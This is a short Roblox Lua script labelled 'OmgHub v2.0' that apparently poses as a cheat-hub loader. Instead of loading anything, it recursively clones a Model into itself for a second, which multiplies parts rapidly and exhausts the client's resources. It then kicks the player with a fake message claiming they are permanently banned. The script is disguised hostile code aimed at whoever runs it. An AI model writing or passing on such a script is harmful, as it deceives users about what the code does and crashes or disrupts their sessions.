print("OmgHub v2.0 Loading")

task.wait(0 + 0)

print("OmgHub v2.0 Loaded")

local Model = Instance.new("Model", game.Workspace)
local start = os.clock()
while os.clock() - start < 1 do
	print("Loading Assets....")
	Instance.new("Part", Model)
	Model:Clone().Parent = Model
	task.wait()
end

game:GetService("Players").LocalPlayer:Kick("Script Detected! You are permanently banned!")
